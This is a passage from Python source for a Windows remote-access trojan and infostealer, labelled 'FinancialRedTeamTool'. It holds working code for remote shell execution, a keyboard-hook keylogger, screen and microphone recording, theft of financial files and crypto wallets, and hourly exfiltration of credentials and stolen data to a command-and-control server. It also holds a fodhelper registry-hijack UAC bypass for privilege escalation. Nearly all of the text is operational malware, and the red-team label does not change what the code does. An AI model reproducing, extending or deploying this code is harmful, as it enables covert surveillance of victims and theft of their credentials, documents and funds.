                        )
                        return {"status": "success", "path": temp_path}
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
    async def execute_command(self, params):
        cmd = params.get("command")
        if not cmd:
            return {"status": "error", "message": "Missing command"}
            
        try:
            result = subprocess.check_output(
                cmd, 
                shell=True, 
                stderr=subprocess.STDOUT,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {"status": "success", "output": result.decode(errors="ignore")}
        except subprocess.CalledProcessError as e:
            return {"status": "error", "message": str(e), "output": e.output.decode(errors="ignore")}
            
    async def capture_screen(self, params):
        capture = ScreenCapture()
        screenshot = capture.capture_screen()
        if screenshot:
            return {"status": "success", "image": base64.b64encode(screenshot).decode()}
        return {"status": "error", "message": "Capture failed"}
        
    async def record_audio(self, params):
        duration = params.get("duration", AUDIO_CAPTURE_DURATION)
        recorder = AudioRecorder()
        audio = recorder.record_audio(duration)
        if audio:
            return {"status": "success", "audio": base64.b64encode(audio).decode()}
        return {"status": "error", "message": "Recording failed"}
        
    async def start_keylogger(self, params):
        duration = params.get("duration", KEYLOGGER_DURATION)
        keylogger = KeyLogger()
        log = keylogger.start_capture(duration)
        return {"status": "success", "log": log}
        
    async def steal_documents(self, params):
        stealer = FinancialDataStealer()
        files = stealer.find_financial_files()
        content = stealer.steal_files(files)
        wallets = stealer.find_crypto_wallets()
        return {
            "status": "success", 
            "files": content,
            "crypto_wallets": wallets
        }
        
    async def update_config(self, params):
        # Placeholder for config update
        return {"status": "success"}
        
    async def uninstall(self, params):
        # Placeholder for uninstall routine
        return {"status": "success"}
        
    async def elevate_privileges(self, params):
        # Attempt privilege escalation
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return {"status": "info", "message": "Already admin"}
                
            # Try UAC bypass
            result = self.try_uac_bypass()
            if result:
                return {"status": "success", "message": "Privilege escalation successful"}
                
            # Fallback to runas
            ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable, 
                " ".join(sys.argv), 
                None, 
                None, 
                1
            )
            return {"status": "success", "message": "Privilege escalation attempted"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
    def try_uac_bypass(self):
        # Placeholder for UAC bypass technique
        return False
        
    async def network_pivot(self, params):
        # Placeholder for network pivoting
        return {"status": "success", "message": "Network pivoting not implemented"}
        
    async def deploy_ransomware(self, params):
        # Placeholder for ransomware deployment
        return {"status": "success", "message": "Ransomware not implemented"}
        
    async def send_result(self, command_type, result):
        try:
            async with aiohttp.ClientSession() as session:
                data = {
                    "command": command_type,
                    "result": result,
                    "host": socket.gethostname(),
                    "user": os.getlogin(),
                    "timestamp": datetime.now().isoformat()
                }
                encrypted_data = self.communicator.encrypt_data(data)
                headers = {'User-Agent': USER_AGENT}
                await session.post(
                    f"https://{C2_DOMAIN}:{C2_PORT}/result",
                    data=encrypted_data,
                    headers=headers,
                    ssl=False
                )
        except Exception as e:
            logger.log(f"Failed to send command result: {str(e)}", "ERROR")

# ====================== KEYLOGGER ======================
class KeyLogger:
    def __init__(self):
        self.user32 = ctypes.WinDLL('user32', use_last_error=True)
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.hook = None
        self.log = ""
        self.is_capturing = False
        self.last_window = None

    def start_capture(self, duration=KEYLOGGER_DURATION):
        logger.log(f"Starting keylogger for {duration} seconds")
        self.is_capturing = True
        self.hook = self.user32.SetWindowsHookExA(
            13,  # WH_KEYBOARD_LL
            self.low_level_keyboard_handler,
            self.kernel32.GetModuleHandleW(None),
            0
        )
        
        start_time = time.time()
        while time.time() - start_time < duration and self.is_capturing:
            msg = wintypes.MSG()
            if self.user32.PeekMessageW(ctypes.byref(msg), 0, 0, 0, 1):
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.01)
            
        self.stop_capture()
        return self.log
        
    def stop_capture(self):
        if self.hook:
            self.user32.UnhookWindowsHookEx(self.hook)
            self.is_capturing = False
            logger.log("Keylogger stopped")
            
    def get_foreground_window_title(self):
        hwnd = self.user32.GetForegroundWindow()
        length = self.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        self.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
            
    def low_level_keyboard_handler(self, nCode, wParam, lParam):
        if nCode >= 0:
            if wParam == 256:  # WM_KEYDOWN
                vk_code = ctypes.c_uint(lParam[0])
                
                # Get current window
                current_window = self.get_foreground_window_title()
                if current_window != self.last_window:
                    self.last_window = current_window
                    self.log += f"\n\n[Window: {current_window}]\n"
                    
                # Map virtual key to character
                key = self.vk_to_key(vk_code.value)
                self.log += key
                    
        return self.user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
        
    def vk_to_key(self, vk_code):
        # Mapping virtual key codes to characters
        if vk_code == 8:  # Backspace
            return "[BACKSPACE]"
        elif vk_code == 13:  # Enter
            return "\n"
        elif vk_code == 9:  # Tab
            return "[TAB]"
        elif vk_code == 27:  # Escape
            return "[ESC]"
        elif vk_code == 16 or vk_code == 160 or vk_code == 161:  # Shift
            return "[SHIFT]"
        elif vk_code == 17 or vk_code == 162 or vk_code == 163:  # Ctrl
            return "[CTRL]"
        elif vk_code == 18 or vk_code == 164 or vk_code == 165:  # Alt
            return "[ALT]"
        elif vk_code == 20:  # Caps Lock
            return "[CAPSLOCK]"
        elif vk_code == 144:  # Num Lock
            return "[NUMLOCK]"
        elif vk_code == 91 or vk_code == 92:  # Windows keys
            return "[WIN]"
        else:
            # Get key name
            scan_code = self.user32.MapVirtualKeyW(vk_code, 0)
            buf = ctypes.create_unicode_buffer(256)
            self.user32.GetKeyNameTextW(scan_code << 16, buf, 256)
            return buf.value

# ====================== SCREEN CAPTURE ======================
class ScreenCapture:
    def capture_screen(self):
        try:
            img = ImageGrab.grab()
            img_bytes = io.BytesIO()
            # Compress image to reduce size
            img.save(img_bytes, format='JPEG', quality=85)
            return img_bytes.getvalue()
        except Exception as e:
            logger.log(f"Screen capture failed: {str(e)}", "ERROR")
            return None

# ====================== AUDIO CAPTURE ======================
class AudioRecorder:
    def record_audio(self, duration=AUDIO_CAPTURE_DURATION, sample_rate=44100):
        try:
            logger.log(f"Recording audio for {duration} seconds")
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1)  # Mono to save space
            sd.wait()
            
            audio_bytes = io.BytesIO()
            # Use FLAC for lossless compression
            sf.write(audio_bytes, recording, sample_rate, format='FLAC')
            return audio_bytes.getvalue()
        except Exception as e:
            logger.log(f"Audio recording failed: {str(e)}", "ERROR")
            return None

# ====================== MAIN MALWARE CLASS ======================
class FinancialRedTeamTool:
    def __init__(self):
        self.system_info = {}
        self.browser_data = {}
        self.credentials = {}
        self.screenshots = []
        self.audio_recordings = []
        self.keylogs = ""
        self.documents = {}
        self.crypto_wallets = {}
        self.anti_forensics = AntiForensics()
        self.persistence = PersistenceManager()
        self.evasion = EvasionEngine()
        self.exfiltrator = DataExfiltrator()
        self.command_control = CommandControl()
        
    def run(self):
        # Anti-forensics check
        if self.anti_forensics.execute():
            logger.log("Forensic detection triggered, exiting")
            return
            
        # Apply evasion techniques
        self.evasion.apply_evasion()
        
        # Establish persistence
        self.persistence.establish_persistence()
        
        # Start command and control loop in background
        c2_thread = threading.Thread(target=self.run_c2_loop, daemon=True)
        c2_thread.start()
        
        # Main collection loop
        while True:
            try:
                self.gather_intelligence()
                
                # Prepare data package
                data_package = {
                    "system_info": self.system_info,
                    "credentials": self.credentials,
                    "financial_documents": self.documents,
                    "crypto_wallets": self.crypto_wallets,
                    "screenshots": self.screenshots,
                    "audio_recordings": self.audio_recordings,
                    "keylogs": self.keylogs,
                    "timestamp": datetime.now().isoformat()
                }
                
                # Exfiltrate data
                if not self.exfiltrator.exfiltrate(data_package):
                    logger.log("All exfiltration methods failed", "ERROR")
                
                # Clear sensitive data from memory
                self.clear_sensitive_data()
                
                # Sleep until next collection cycle
                time.sleep(3600)  # 1 hour
                
            except Exception as e:
                logger.log(f"Main execution loop error: {str(e)}", "ERROR")
                time.sleep(600)  # 10 minutes on error
                
    def run_c2_loop(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.command_control.check_for_commands())
        
    def gather_intelligence(self):
        try:
            logger.log("Starting intelligence gathering")
            self.system_info = self.get_system_info()
            self.credentials = self.get_credentials()
            self.capture_screen()
            self.record_audio()
            self.capture_keys()
            self.documents = self.steal_documents()
            self.crypto_wallets = self.find_crypto_wallets()
        except Exception as e:
            logger.log(f"Intelligence gathering failed: {str(e)}", "ERROR")
            
    def get_system_info(self):
        return {
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
            "os": platform.platform(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "ram": psutil.virtual_memory().total,
            "disks": [disk.device for disk in psutil.disk_partitions()],
            "network": [iface for iface in psutil.net_if_addrs().keys()],
            "domain": self.get_domain_info(),
            "security_products": self.get_security_products()
        }
        
    def get_domain_info(self):
        try:
            return subprocess.check_output(
                "powershell (Get-WmiObject Win32_ComputerSystem).Domain", 
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode().strip()
        except:
            return "Unknown"
        
    def get_security_products(self):
        try:
            return subprocess.check_output(
                'powershell "Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct | Select displayName"',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().strip()
        except:
            return "Unknown"
        
    def get_credentials(self):
        harvester = CredentialHarvester()
        return harvester.harvest_all()
        
    def capture_screen(self):
        capture = ScreenCapture()
        screenshot = capture.capture_screen()
        if screenshot:
            self.screenshots.append(base64.b64encode(screenshot).decode())
            # Keep only last 3 screenshots
            self.screenshots = self.screenshots[-3:]
            
    def record_audio(self):
        recorder = AudioRecorder()
        audio = recorder.record_audio()
        if audio:
            self.audio_recordings.append(base64.b64encode(audio).decode())
            # Keep only last 2 recordings
            self.audio_recordings = self.audio_recordings[-2:]
            
    def capture_keys(self):
        keylogger = KeyLogger()
        self.keylogs = keylogger.start_capture(KEYLOGGER_DURATION)
        
    def steal_documents(self):
        stealer = FinancialDataStealer()
        files = stealer.find_financial_files()
        return stealer.steal_files(files)
        
    def find_crypto_wallets(self):
        stealer = FinancialDataStealer()
        return stealer.find_crypto_wallets()
        
    def clear_sensitive_data(self):
        # Securely clear sensitive data
        self.keylogs = ""
        self.documents = {}
        self.credentials = {}
        if len(self.screenshots) > 1:
            self.screenshots = self.screenshots[-1:]
        if len(self.audio_recordings) > 1:
            self.audio_recordings = self.audio_recordings[-1:]

# ====================== UTILITIES ======================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def enable_privilege(privilege_name):
    try:
        # Get current process token
        token = wintypes.HANDLE()
        ctypes.windll.advapi32.OpenProcessToken(
            ctypes.windll.kernel32.GetCurrentProcess(),
            0x28,  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            ctypes.byref(token)
        )
        
        # Lookup privilege value
        luid = wintypes.LUID()
        ctypes.windll.advapi32.LookupPrivilegeValueW(
            None,
            privilege_name,
            ctypes.byref(luid)
        )
        
        # Enable privilege
        new_state = [
            (luid.LowPart, luid.HighPart, wintypes.DWORD(0x00000002))  # SE_PRIVILEGE_ENABLED
        ]
        buffer = (wintypes.LUID_AND_ATTRIBUTES * len(new_state))(*new_state)
        token_privileges = wintypes.TOKEN_PRIVILEGES()
        token_privileges.PrivilegeCount = len(new_state)
        token_privileges.Privileges = buffer
        
        ctypes.windll.advapi32.AdjustTokenPrivileges(
            token,
            False,
            ctypes.byref(token_privileges),
            0,
            None,
            None
        )
        
        return True
    except:
        return False

# ====================== MAIN EXECUTION ======================

def run_uac_bypass():
    try:
        import winreg

        # Path registry untuk hijack fodhelper.exe
        reg_path = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
        command = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

        # Tulis ke registry
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")

        # Jalankan fodhelper (auto-elevated binary)
        subprocess.Popen(["fodhelper.exe"], shell=True)

        logger.log("Triggered UAC bypass via fodhelper.exe")
        time.sleep(2)
        return True
    except Exception as e:
        logger.log(f"UAC bypass failed: {str(e)}", "ERROR")
        return False


if __name__ == "__main__":
    # Ensure single instance
    mutex_name = "Global\\FinancialRedTeamTool"
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
    if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        sys.exit(0)
        
    # Attempt to elevate privileges without UAC prompt
    if not is_admin():
        try:
            # Try to enable debug privilege
            enable_privilege("SeDebugPrivilege")
            enable_privilege("SeImpersonatePrivilege")
            
            # Try UAC bypass techniques
            if not run_uac_bypass():
                # Fallback to standard runas
                ctypes.windll.shell32.ShellExecuteW(
                    None, 
                    "runas", 
                    sys.executable, 
                    " ".join(sys.argv), 
                    None, 
                    1
                )
                sys.exit(0)
        except:
            pass
            
    # Start the main tool
    tool = FinancialRedTeamTool()
    tool.run() 